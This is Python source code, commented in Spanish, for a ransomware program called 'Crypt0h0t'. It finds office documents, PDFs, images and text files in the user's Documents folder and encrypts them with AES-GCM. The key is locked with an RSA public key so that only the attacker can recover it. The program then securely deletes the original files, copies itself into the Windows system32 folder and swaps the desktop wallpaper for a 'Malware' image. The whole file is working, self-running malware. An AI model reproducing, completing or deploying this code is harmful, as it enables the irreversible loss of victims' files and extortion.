from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Protocol.KDF import PBKDF2

import os
import sys
import shutil
import re
import base64
import gc

import secure_delete
from wallpaper import cambiarFondo
from llave import extraeLlave


class Crypt0h0t:
    """
    Clase principal del programa.

    Atributos:
    password -- Contraseña para cifrar los archivos.
    archivos -- Lista con las rutas de los archivos por cifrar.
    pattern -- Expresión regular para filtrar los archivos que se cifran.
    
    """
    def __init__(self) -> None:
        self.password = ''
        self.archivos = []
        self.pattern = re.compile(r'.*\.(docx|xlsx|pdf|jpeg|jpg|txt)$')
        self.listarArchivos()
        # Ruta de la llave pública para cifrar la contraseña.
        path = extraeLlave()
        self.generarPassword(path)

    def listarArchivos( self ):
        """
        Método para listar los archivos que se cifrarán.
        """
        # Ruta de la carpeta Documents del usuario.
        documentos_path = os.path.join( os.environ['USERPROFILE'], 'Documents' )
        for root, _, files in os.walk( documentos_path ):
            for file in files:
                if self.pattern.match( file ): 
                    self.archivos.append( os.path.join( root, file ) )

    def generarPassword( self, archivo ):
        """
        Método para generar una contraseña aleatoria y cifrarla con la llave pública RSA.

        Parámetros:
        archivo -- Ruta de la llave pública.
        """
        self.password =  base64.urlsafe_b64encode( get_random_bytes( 16 ) )
        with open( archivo, 'rb' ) as archivo:
            llavePublica = RSA.import_key( archivo.read() )
        cipher = PKCS1_OAEP.new( llavePublica )  
        passwordCifrada = cipher.encrypt( self.password )
        with open( 'password.enc', 'wb' ) as f:
            f.write( passwordCifrada )

    def derivarLlaves( self, password, salt ):
            """
            Método para derivar una llave de 32 bytes a partir de la contraseña y la salt.

            Parámetros:
            password -- Contraseña.
            salt -- Salt.
            """
            return PBKDF2( password, salt, dkLen=32, count=100000 ) 

    def cifrarArchivos( self, extension='enc' ):
        """
        Método para cifrar los archivos.
    
        Parámetros:
        extension -- Extensión de los archivos cifrados, en este caso enc.
        """
        for archivo in self.archivos:
            with open( archivo, 'rb' ) as f:
                datos = f.read()

            header = f'Archivo:{ archivo }'.encode( 'utf-8' ) 
            salt = get_random_bytes( 16 )
            key = self.derivarLlaves( self.password.decode( 'utf-8' ).encode(), salt )
            cipher = AES.new( key, AES.MODE_GCM )
            cipher.update( header )
            
            ciphertext, tag = cipher.encrypt_and_digest( datos )
            documentoCifrado = f'{ archivo }.{ extension }'
            with open( documentoCifrado, 'wb' ) as f:
                f.write( salt )
                f.write( cipher.nonce )
                f.write( tag )
                f.write( ciphertext )
            # Para borrar los archivos originales.
            secure_delete.delete(archivo)

    def copiarExe( self ):
        """
        Método para copiar el ejecutable en la carpeta system32.
        """
        origen = sys.executable
        destino = os.path.join( os.environ['WINDIR'], 'system32' )
        try:
            shutil.copy(origen, destino)
        except Exception as e:
            print( f'No jalo: {e}' )

def main():
    cambiarFondo( 'Malware.jpg' )
    r = Crypt0h0t()
    r.copiarExe()
    r.cifrarArchivos()
    
    # Sobreescribimos de la contraseña en memoria
    r.password = "\0" * len(r.password)
    # Utilizamos del para eliminar las referencias al objeto.
    del r.password
    # Forzamos la recolección de basura.
    gc.collect()


main()